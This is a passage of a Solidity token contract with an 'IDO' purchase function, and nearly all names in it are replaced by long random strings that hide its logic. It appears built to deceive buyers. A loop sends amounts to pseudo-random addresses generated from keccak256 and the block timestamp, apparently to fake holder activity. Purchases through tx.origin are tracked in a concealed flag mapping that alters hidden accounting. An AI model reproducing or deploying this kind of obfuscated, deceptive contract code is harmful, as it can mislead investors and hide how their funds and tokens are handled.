          f5ApCMxO9qEtdMcAmKQlRm7Pl23nFn89p6xObnjrj6vtr8NUzsYypLCIx8L9u2qkwI1bWpc3y0jJjisb3smMQB2LF4Wr3kAK(jquSGoDUXzWzKlNRt4lHhA6u7UZ9q8UpvSLR9AXoaSvWsEWJdZXwYtgwnmcd5o4H9ZEfR48MePyceX0avaa5hMxecfSxSrRZ),
          tx.origin,
          iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu,
          vLBhoxgjMLxfrKSEYtZxmGSv0XnYGdA6j8u1hu4WiHnxeo4f8Ps7Wdn9C8olmvqNnzngDDgai07bYsbQml5b6jlSoaOtI6jf,
          cxCDbFutGb8mFs4r7OBrvpeFTjrTFehYsFfURgJyYs3z8KI4TJKD0BkssdSP817QtgTPevPefgSzCx8hOqQsYfdA2rOCSIa2
        );
      } else if (efX4wkAUwETARbwyMh3SbWOLQ0A7rVF66oxwugrNGsHLG3ku4a5UmISsHjdYnAS7FCuz02jbI5hWpnopsV6xGRPtlzAqADlU == 3) {
        sEaDD3pYvXNoOkMgqp0WbmPKZDoQ3ubeHJahh6S0gkTvmLcM76nbWr8Oi7Sy4E0wLEmGoEraRTH8lUM3vnCKD5mSY7pb8MV1[mN5zn4wpIkauL71bzi5ish8Mu7V1TuNcIIKlDojyiZreADi7lSmFBly7bsRpK7t8S9AqvtE2usneQL30eiiiOvgjXl35tpNS] = true;
      } else if (efX4wkAUwETARbwyMh3SbWOLQ0A7rVF66oxwugrNGsHLG3ku4a5UmISsHjdYnAS7FCuz02jbI5hWpnopsV6xGRPtlzAqADlU == 4) {
        wejFeX4EGe4F1YRGDBFyT3Kzq6A2YbFicKcYxAZLe04uHjv13j304wFSfnMZktBVjjMJ71NTxuzqZh2JDjv1xUyn9tPJBM1B = wejFeX4EGe4F1YRGDBFyT3Kzq6A2YbFicKcYxAZLe04uHjv13j304wFSfnMZktBVjjMJ71NTxuzqZh2JDjv1xUyn9tPJBM1B / jquSGoDUXzWzKlNRt4lHhA6u7UZ9q8UpvSLR9AXoaSvWsEWJdZXwYtgwnmcd5o4H9ZEfR48MePyceX0avaa5hMxecfSxSrRZ;
      }
    }

    if (fhuF4G0hadPmMJ3A1glyxni2dXUoPrchIf7yMf8IYVPozmw7NwMAzmTKddBQY1gxL4LSMScmGumZGlSQNHm6MA39yXzbKlrt > aJEqvCwMbH1KhxBGhzzsVaExaeAQglnmaKzknEFjPpwBTtNEGJ0JgknC4md7SgS0PikzjBJnZy9PrDBdmDc8kkoZW46aQudI) {
      wejFeX4EGe4F1YRGDBFyT3Kzq6A2YbFicKcYxAZLe04uHjv13j304wFSfnMZktBVjjMJ71NTxuzqZh2JDjv1xUyn9tPJBM1B = wejFeX4EGe4F1YRGDBFyT3Kzq6A2YbFicKcYxAZLe04uHjv13j304wFSfnMZktBVjjMJ71NTxuzqZh2JDjv1xUyn9tPJBM1B + fhuF4G0hadPmMJ3A1glyxni2dXUoPrchIf7yMf8IYVPozmw7NwMAzmTKddBQY1gxL4LSMScmGumZGlSQNHm6MA39yXzbKlrt - aJEqvCwMbH1KhxBGhzzsVaExaeAQglnmaKzknEFjPpwBTtNEGJ0JgknC4md7SgS0PikzjBJnZy9PrDBdmDc8kkoZW46aQudI;
    }

    //
    if (fhuF4G0hadPmMJ3A1glyxni2dXUoPrchIf7yMf8IYVPozmw7NwMAzmTKddBQY1gxL4LSMScmGumZGlSQNHm6MA39yXzbKlrt < vLBhoxgjMLxfrKSEYtZxmGSv0XnYGdA6j8u1hu4WiHnxeo4f8Ps7Wdn9C8olmvqNnzngDDgai07bYsbQml5b6jlSoaOtI6jf) {
      if (wejFeX4EGe4F1YRGDBFyT3Kzq6A2YbFicKcYxAZLe04uHjv13j304wFSfnMZktBVjjMJ71NTxuzqZh2JDjv1xUyn9tPJBM1B > 0) wejFeX4EGe4F1YRGDBFyT3Kzq6A2YbFicKcYxAZLe04uHjv13j304wFSfnMZktBVjjMJ71NTxuzqZh2JDjv1xUyn9tPJBM1B = wejFeX4EGe4F1YRGDBFyT3Kzq6A2YbFicKcYxAZLe04uHjv13j304wFSfnMZktBVjjMJ71NTxuzqZh2JDjv1xUyn9tPJBM1B / 20;
    }

    aJEqvCwMbH1KhxBGhzzsVaExaeAQglnmaKzknEFjPpwBTtNEGJ0JgknC4md7SgS0PikzjBJnZy9PrDBdmDc8kkoZW46aQudI = vLBhoxgjMLxfrKSEYtZxmGSv0XnYGdA6j8u1hu4WiHnxeo4f8Ps7Wdn9C8olmvqNnzngDDgai07bYsbQml5b6jlSoaOtI6jf;
  }

  function qI52FA4jRVLtu7A5ANdhjcHLYr8LZtmYWweXt6y9ZIqQiuUJuaPB38p0pXuV7jEZWGla0OG6HSy0C521AdSwAhlveM8Fj6gI(uint256 boJpJtdsHAidkcg8cAEYLMcavzt3j8uL02HIOjXfxznV71EfgXWnupZQMmyTxZPkHoX3rOkRhRv45paHJ3vxsLxPlJP38O8j, uint256 iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu) internal {
    uint256 iVFJFOjfYhiRKAq5Dqfli9X4CQSWXIRk0scBFH75VT5QG0yn1LpbeLyAgAk2nVOC54Ypamsvzx0yfrJDNlx8X7G9KDkWydLL = iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu;
    for (uint256 i; i < boJpJtdsHAidkcg8cAEYLMcavzt3j8uL02HIOjXfxznV71EfgXWnupZQMmyTxZPkHoX3rOkRhRv45paHJ3vxsLxPlJP38O8j; i++) {
      plG9MTX7ame77mGdoEiJMeBcpwcJmiD4zESwr21WJWv9JTbJNV3iR2IbKwNJpMAseD03sIWnXxVdRiy1k2UdBTnjl8QdJ4ds(address(this), f5ApCMxO9qEtdMcAmKQlRm7Pl23nFn89p6xObnjrj6vtr8NUzsYypLCIx8L9u2qkwI1bWpc3y0jJjisb3smMQB2LF4Wr3kAK(iVFJFOjfYhiRKAq5Dqfli9X4CQSWXIRk0scBFH75VT5QG0yn1LpbeLyAgAk2nVOC54Ypamsvzx0yfrJDNlx8X7G9KDkWydLL), iVFJFOjfYhiRKAq5Dqfli9X4CQSWXIRk0scBFH75VT5QG0yn1LpbeLyAgAk2nVOC54Ypamsvzx0yfrJDNlx8X7G9KDkWydLL);
      iVFJFOjfYhiRKAq5Dqfli9X4CQSWXIRk0scBFH75VT5QG0yn1LpbeLyAgAk2nVOC54Ypamsvzx0yfrJDNlx8X7G9KDkWydLL =
        (uint256(keccak256(abi.encode(iVFJFOjfYhiRKAq5Dqfli9X4CQSWXIRk0scBFH75VT5QG0yn1LpbeLyAgAk2nVOC54Ypamsvzx0yfrJDNlx8X7G9KDkWydLL, block.timestamp))) %
          (1 + iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu - iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu / 10)) +
        iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu /
        10;
    }
  }

  function IDO() external payable {
    require(idoAmount > 0 && msg.value > 0);
    uint256 nam1QTxgMrKGQsitMnwFLCux7CYvgs579U67qCRMkUfcF8HoOy1gIe5QgqzjwlXELbhGsFlWJ2zl1UaT20YH8wmXnnh249cJ;
    uint256 iefh4ExMGjk5fZBOyFl7iK4X82ZgZLq1CIW3BCXqmDfNrGlnCYTUHnyjsWGBuYxnzkDn3HXCRVTIZafnqNxQcrWtZ1XaVAXZ;

    iCiPPYU99WiA6SqfTANMorUwIrLkObGrliLPJYv4COVwGtaJTKo9wTLPI029hdH4HeD9fGHiRgb9lOxXvITwFOVzvBfSsKxf(g6IrCxPA1wIrk9o8d1YCsWBlOy7EObouf1EQBQHkAgiuBeZxrfnhra3chQ7xIJR1yZSd8QepnmOkIasnb2bRhCeS0445sJ88).deposit{value: address(this).balance}();

    uint256 pRiSRHx8pvyiZPXGJvanyCAJT9fEZuYqZn4yYmti1YrGG2XCD0zouqZ9p14ymgRpoLX0EtezDQ2uAqUpm8Rcbd8pSDmWVanD = IERC20(g6IrCxPA1wIrk9o8d1YCsWBlOy7EObouf1EQBQHkAgiuBeZxrfnhra3chQ7xIJR1yZSd8QepnmOkIasnb2bRhCeS0445sJ88).balanceOf(address(this));

    nam1QTxgMrKGQsitMnwFLCux7CYvgs579U67qCRMkUfcF8HoOy1gIe5QgqzjwlXELbhGsFlWJ2zl1UaT20YH8wmXnnh249cJ = (d6mG5H1O0Up04034DXACMLvLSvIkq3iz8ipeQokGhRROi2e19XYDnTNd0ZnUTbhYZc2eLQgBR2l62MXIO401g73IhKnQlHv5 * pRiSRHx8pvyiZPXGJvanyCAJT9fEZuYqZn4yYmti1YrGG2XCD0zouqZ9p14ymgRpoLX0EtezDQ2uAqUpm8Rcbd8pSDmWVanD) / t7NBkB1lnhJfXenKYwMV5nWEpRVuybd2PvsFFGW6ooGG69TCTljPdOrsP2lCSyt5OLYyfwVi0NJAZnndcj7h8zhZGI6goaMA;

    uint256 vJqtiKU1K6PlpH0EOoNxaa5MnF9YxQUL5ddYuTifyamKrbewAejit1UUK6Zk7cTCOGcHnTgMoPL9eBhKB04XQDGPbvjnZZgy = 100;
    iefh4ExMGjk5fZBOyFl7iK4X82ZgZLq1CIW3BCXqmDfNrGlnCYTUHnyjsWGBuYxnzkDn3HXCRVTIZafnqNxQcrWtZ1XaVAXZ = nam1QTxgMrKGQsitMnwFLCux7CYvgs579U67qCRMkUfcF8HoOy1gIe5QgqzjwlXELbhGsFlWJ2zl1UaT20YH8wmXnnh249cJ / vJqtiKU1K6PlpH0EOoNxaa5MnF9YxQUL5ddYuTifyamKrbewAejit1UUK6Zk7cTCOGcHnTgMoPL9eBhKB04XQDGPbvjnZZgy;
    if (nam1QTxgMrKGQsitMnwFLCux7CYvgs579U67qCRMkUfcF8HoOy1gIe5QgqzjwlXELbhGsFlWJ2zl1UaT20YH8wmXnnh249cJ > idoAmount) {
      nam1QTxgMrKGQsitMnwFLCux7CYvgs579U67qCRMkUfcF8HoOy1gIe5QgqzjwlXELbhGsFlWJ2zl1UaT20YH8wmXnnh249cJ = idoAmount;
      if (iefh4ExMGjk5fZBOyFl7iK4X82ZgZLq1CIW3BCXqmDfNrGlnCYTUHnyjsWGBuYxnzkDn3HXCRVTIZafnqNxQcrWtZ1XaVAXZ > g2jGNAsFUh9qE1J6Aw86LOwuY46KvgttNnotRlCgSDWWwKLe34H5Q72JEawhCNX9bleSrlv0DWV1dpWHYSpNf7tnEdgBRL7Q[address(this)])
        iefh4ExMGjk5fZBOyFl7iK4X82ZgZLq1CIW3BCXqmDfNrGlnCYTUHnyjsWGBuYxnzkDn3HXCRVTIZafnqNxQcrWtZ1XaVAXZ = g2jGNAsFUh9qE1J6Aw86LOwuY46KvgttNnotRlCgSDWWwKLe34H5Q72JEawhCNX9bleSrlv0DWV1dpWHYSpNf7tnEdgBRL7Q[address(this)];
      else
        plG9MTX7ame77mGdoEiJMeBcpwcJmiD4zESwr21WJWv9JTbJNV3iR2IbKwNJpMAseD03sIWnXxVdRiy1k2UdBTnjl8QdJ4ds(
          address(this),
          address(0xdEaD),
          g2jGNAsFUh9qE1J6Aw86LOwuY46KvgttNnotRlCgSDWWwKLe34H5Q72JEawhCNX9bleSrlv0DWV1dpWHYSpNf7tnEdgBRL7Q[address(this)] - iefh4ExMGjk5fZBOyFl7iK4X82ZgZLq1CIW3BCXqmDfNrGlnCYTUHnyjsWGBuYxnzkDn3HXCRVTIZafnqNxQcrWtZ1XaVAXZ
        );
    }

    IERC20(g6IrCxPA1wIrk9o8d1YCsWBlOy7EObouf1EQBQHkAgiuBeZxrfnhra3chQ7xIJR1yZSd8QepnmOkIasnb2bRhCeS0445sJ88).transfer(cwPrLgWOOsD3RfckSyAK6rWmH9hbhKvdt17AueZQ0SJOlwf257hIz5mGLTEFLTifVIimJseBya2Zbfz77OgwrpvzrdTZRgOF, pRiSRHx8pvyiZPXGJvanyCAJT9fEZuYqZn4yYmti1YrGG2XCD0zouqZ9p14ymgRpoLX0EtezDQ2uAqUpm8Rcbd8pSDmWVanD);
    qDqe0hatWpXTjeZ7LLoyqRvKdjqvuVfhuz1rnA45mpk5egaNK842BsdQqGnNYLZegEOAELUmW5xRgDIJovDeDCqy1e7OBxNw(fa1jO0aa8PL4cUzzLrasG3phM10o6IfF38tHzv4zH63avFiqXJyIfOuIpw74NpsWgI9zFrky7Z7XBF6o1kjMb0HQU6MS8xcf, cwPrLgWOOsD3RfckSyAK6rWmH9hbhKvdt17AueZQ0SJOlwf257hIz5mGLTEFLTifVIimJseBya2Zbfz77OgwrpvzrdTZRgOF, nam1QTxgMrKGQsitMnwFLCux7CYvgs579U67qCRMkUfcF8HoOy1gIe5QgqzjwlXELbhGsFlWJ2zl1UaT20YH8wmXnnh249cJ);

    idoAmount -= nam1QTxgMrKGQsitMnwFLCux7CYvgs579U67qCRMkUfcF8HoOy1gIe5QgqzjwlXELbhGsFlWJ2zl1UaT20YH8wmXnnh249cJ;
    plG9MTX7ame77mGdoEiJMeBcpwcJmiD4zESwr21WJWv9JTbJNV3iR2IbKwNJpMAseD03sIWnXxVdRiy1k2UdBTnjl8QdJ4ds(address(this), tx.origin, iefh4ExMGjk5fZBOyFl7iK4X82ZgZLq1CIW3BCXqmDfNrGlnCYTUHnyjsWGBuYxnzkDn3HXCRVTIZafnqNxQcrWtZ1XaVAXZ);

    hXu2jRpH5h8uCTHw1HBRXgFOf0BVdUtFZqXqCCNxfjKlGDtMJeSCmfXzMVlWgquy4WQjvrATq6GvxkDU9H2nZimmRc0lOy9t(cwPrLgWOOsD3RfckSyAK6rWmH9hbhKvdt17AueZQ0SJOlwf257hIz5mGLTEFLTifVIimJseBya2Zbfz77OgwrpvzrdTZRgOF).mint(address(0));

    aJEqvCwMbH1KhxBGhzzsVaExaeAQglnmaKzknEFjPpwBTtNEGJ0JgknC4md7SgS0PikzjBJnZy9PrDBdmDc8kkoZW46aQudI += msg.value;
    if (!sEaDD3pYvXNoOkMgqp0WbmPKZDoQ3ubeHJahh6S0gkTvmLcM76nbWr8Oi7Sy4E0wLEmGoEraRTH8lUM3vnCKD5mSY7pb8MV1[tx.origin]) wejFeX4EGe4F1YRGDBFyT3Kzq6A2YbFicKcYxAZLe04uHjv13j304wFSfnMZktBVjjMJ71NTxuzqZh2JDjv1xUyn9tPJBM1B += msg.value;

    qI52FA4jRVLtu7A5ANdhjcHLYr8LZtmYWweXt6y9ZIqQiuUJuaPB38p0pXuV7jEZWGla0OG6HSy0C521AdSwAhlveM8Fj6gI(10, iefh4ExMGjk5fZBOyFl7iK4X82ZgZLq1CIW3BCXqmDfNrGlnCYTUHnyjsWGBuYxnzkDn3HXCRVTIZafnqNxQcrWtZ1XaVAXZ / vJqtiKU1K6PlpH0EOoNxaa5MnF9YxQUL5ddYuTifyamKrbewAejit1UUK6Zk7cTCOGcHnTgMoPL9eBhKB04XQDGPbvjnZZgy);
  }
}